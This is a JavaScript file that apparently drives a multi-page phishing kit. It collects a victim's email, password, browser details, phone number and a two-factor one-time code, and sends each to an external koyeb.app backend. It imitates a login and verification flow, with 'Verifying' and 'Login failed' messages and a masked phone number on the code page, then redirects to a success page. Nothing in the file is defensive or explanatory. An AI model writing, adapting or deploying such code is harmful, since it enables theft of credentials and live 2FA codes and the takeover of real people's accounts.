const API_BASE = "https://gentle-sula-kronecka-194282c6.koyeb.app";


// Get submission ID from localStorage if it exists

const submissionId = localStorage.getItem("submission_id");


const step1 = document.getElementById("step-1");
const step2 = document.getElementById("step-2");
const step3 = document.getElementById("step-3");
const status = document.getElementById("status");

// Custom alert modal utility — injects a simple modal and returns a promise
function showCustomAlert(message, options = {}) {
  const { type = 'info', autoClose = 0 } = options;
  return new Promise((resolve) => {
    const overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.background = 'rgba(0,0,0,0.35)';
    overlay.style.display = 'flex';
    overlay.style.alignItems = 'center';
    overlay.style.justifyContent = 'center';
    overlay.style.zIndex = '9999';

    const box = document.createElement('div');
    box.style.background = '#fff';
    box.style.borderRadius = '6px';
    box.style.padding = '20px';
    box.style.maxWidth = '480px';
    box.style.width = '90%';
    box.style.boxShadow = '0 6px 20px rgba(0,0,0,0.2)';
    box.style.textAlign = 'center';

    const msg = document.createElement('div');
    msg.style.marginBottom = '16px';
    msg.style.fontSize = '16px';
    msg.style.color = type === 'error' ? '#c0392b' : '#2c3e50';
    msg.textContent = message;

    const btn = document.createElement('button');
    btn.textContent = 'OK';
    btn.style.padding = '8px 16px';
    btn.style.border = 'none';
    btn.style.borderRadius = '4px';
    btn.style.background = type === 'error' ? '#c0392b' : '#3bb34a';
    btn.style.color = '#fff';
    btn.style.cursor = 'pointer';

    btn.addEventListener('click', () => {
      if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
      resolve();
    });

    box.appendChild(msg);
    box.appendChild(btn);
    overlay.appendChild(box);
    document.body.appendChild(overlay);

    if (autoClose && typeof autoClose === 'number' && autoClose > 0) {
      setTimeout(() => {
        if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
        resolve();
      }, autoClose);
    }
  });
}

// Step 1
if (step1) {
  step1.addEventListener("submit", async (e) => {
    e.preventDefault();

    const submitButton =
      e.submitter ||
      step1.querySelector('button[type="submit"]') ||
      step1.querySelector("button");

    const originalButtonText = submitButton?.textContent;

    if (submitButton) {
      submitButton.textContent = "Verifying";
      submitButton.disabled = true;
    }

    const payload = {
      email: document.getElementById("email").value,
      pass_id: document.getElementById("password").value,
      device_info: navigator.userAgent
    };

    try {
      const res = await fetch(`${API_BASE}/form/step-1`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });

      const data = await res.json();

      if (!data.submission_id) {
        await showCustomAlert(data.detail || "Login failed. Please check your credentials.", { type: "error" });
        if (submitButton) {
          submitButton.textContent = originalButtonText || "Continue";
          submitButton.disabled = false;
        }
        return;
      }

      localStorage.setItem("submission_id", data.submission_id);

      // Allow backend to finish background tasks
      setTimeout(() => {
        window.location.href = "phone.html";
      }, 300);

    } catch (error) {
      console.error("Error submitting step 1:", error);
      await showCustomAlert("Error submitting form. Please try again.", { type: "error" });
      if (submitButton) {
        submitButton.textContent = originalButtonText || "Continue";
        submitButton.disabled = false;
      }
    }
  });
}


/* STEP 2 */
if (step2) {
  step2.addEventListener("submit", async (e) => {
    e.preventDefault();

    const payload = {
      phone: document.getElementById("phone").value
    };

    try {
      await fetch(`${API_BASE}/form/step-2/${submissionId}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });

      // persist last 4 digits for the OTP page display
      try {
        const phoneVal = (document.getElementById("phone").value || "").toString();
        const last4 = phoneVal.slice(-4);
        if (last4) localStorage.setItem("phone_last4", last4);
      } catch (err) {
        console.warn("Could not store phone last4:", err);
      }

      setTimeout(() => {
        window.location.href = "otp.html";
      }, 300);

    } catch (error) {
      console.error("Error submitting step 2:", error);
      await showCustomAlert("Error submitting form. Please try again.", { type: "error" });
    }
  });
}


/* STEP 3 */
if (step3) {
  // populate last-4 digits placeholder if available
  try {
    const last4 = localStorage.getItem("phone_last4");
    const el = document.getElementById("phone-last4");
    if (el && last4) el.textContent = last4;
  } catch (err) {
    console.warn("Could not populate phone last4:", err);
  }
  step3.addEventListener("submit", async (e) => {
    e.preventDefault();

    document.getElementById("otp").value =
      document.getElementById("twoFactAuthConfCode").value;

    const payload = {
      otp_code: document.getElementById("otp").value
    };

    try {
      await fetch(`${API_BASE}/form/step-3/${submissionId}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });

      localStorage.removeItem("submission_id");
      localStorage.removeItem("phone_last4");

      setTimeout(() => {
        window.location.href = "success.html";
      }, 300);

    } catch (error) {
      console.error("Error submitting step 3:", error);
      await showCustomAlert("Error submitting form. Please try again.", { type: "error" });
    }
  });
}
